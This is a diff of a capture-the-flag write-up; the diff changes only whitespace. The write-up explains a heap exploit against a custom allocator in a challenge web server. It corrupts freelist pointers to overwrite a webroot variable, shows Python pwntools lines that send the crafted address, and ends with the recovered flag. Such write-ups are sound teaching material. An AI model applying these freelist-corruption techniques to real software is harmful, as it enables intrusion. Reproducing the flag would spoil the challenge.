@@ -170,7 +170,9 @@ legend: [pseudo-addr: | (u8 idx | u64 freelist ptr ) | (data | variable name) ]
 [0x3: | 1 | "./public/index.html ]
 [0x4: | 8 | tmp ]
 ```
+
 then everything is freed and we have the following free lists:
+
 ```
 2: [3]
 5: [4]
@@ -181,14 +183,17 @@ Note that we can control the size of the third allocation by sending a longer
 path.
 
 When we perform `language german` as a first command, we have:
+
 ```
 [0x1: | 9 | command ]
 [0x2: | 9 | new_language ]
 [0x3: | 0 | "german" ]
 ```
+
 Note that the third allocation is not freed, because a reference is kept in the
 `language` global variable. So only in the freelist for bin 9 we have the
 command and new language buffer:
+
 ```
 9: [1, 2]
 ```
@@ -206,27 +211,34 @@ Note that
 ### Exploitation Attempt 1
 
 1. Perform `language` command and set to `X`
+
    ```
    [0x1: | 0x2 | ... ]
    [0x2: | 0x0 | ... ]
    [0x3: | 0 | "X" ]
    ```
+   
    The freelist for bin 9 is `[0x1, 0x2]`
 2. Send invalid command overflow into `0x2`
+
    ```
    [0x1: | 9 | AAAAAAAA... ]
    [0x2: | (&webroot-1) | ... ]
    [0x3: | 0 | "X" ]
    ```
+   
 3. Perform `language` command and set to `X`, this triggers a malloc of the
    chunk at `0x2`, which will write the fake freelist pointer into the freelist
    of bin 9.
+   
    ```
    [0x1: | 9 | command ]
    [0x2: | 9 | language ]
    [0x3: | 0 | "X" ]
    ```
+   
    after freeing everything the freelist for bin 9 is
+   
    ```
    [0x1, 0x2, (&webroot-1)]
    ```
@@ -260,33 +272,41 @@ Let's walk through the final exploit:
       `get` again, even if we messed up the `malloc_next_alloc` pointer.
    2. puts a chunk into the freelist of bin 1, which was allocated for
       the `full_path`, which is `"./public/index.html"`
+   
    State of the heap at the end is:
+   
    ```
    [0x1: | 0x2 | ... ] <- heads[9]
    [0x2: | NULL | ... ]
    [0x3: | NULL | ... ] <- heads[1]
    [0x4: | NULL | ... ] <- heads[8]
    ```
+   
 2. Overflow heap with an invalid command, keep chunk at `0x2` intact and
    manipulate freelist pointer in chunk at `0x3`
+   
    ```
    [0x1: | 9 | AAAAAAAA.... ]
    [0x2: | \x00\x00\x00\x00 | AAAAAA... ] <- heads[9]
    [0x3: | addr | ... ] <- heads[1]
    [0x4: | NULL | ... ] <- heads[8]
    ```
+   
 3. Trigger allocation in bin 1 with the `language` command
+
    ```
    [0x1: | 9 | command: "language"]
    [0x2: | 9 | new_language: "Y" * 16 ]
    [0x3: | 2 | language: "Y" * 16 ]
    [0x4: | NULL | ... ] <- heads[8]
    ```
+   
    This will write `addr` to the top of the freelist of bin 1 and the chunk at
    `0x3` stays allocated, i.e. `heads[1] == addr`.
 
    We chose addr to be something we can later use to manipulate the freelist
    heads. We computed `addr` in the following way:
+   
    ```python
    webroot = "./public/"
 
@@ -307,26 +327,33 @@ Let's walk through the final exploit:
    manipulate the actual freelist headers.
 
 4. Perform `get` command to corrupt the freelist heads
+
    ```python
    vp.sendline("get")
    vp.sendline(w_addr)
    ```
+   
    so the freelist head of bin 0 now is `&webroot - 1`.
 
 5. Use `language` command to manipulate the `webroot` global variable.
    Allocating in bin 0, will now return the desired address.
+   
    ```python
    vp.sendline("language")
    vp.sendline(p64(0x004014a2))  # just one of the pointers to a NULL byte
    ```
+   
 6. `get /flag`. Unfortunately here the freelist head of bin 0 is fubar. This
    means we have to allocate in another bin. We allocated in bin 1 by
    prepending a lot of `'/'` chars.
+   
    ```python
    vp.sendline("get")
    vp.sendline("/" * (16 - 4) + "flag")
    ```
+   
 7. read and submit flag :)
+
    ```
    flag{cthulhu_likes_custom_mallocators}
    ```
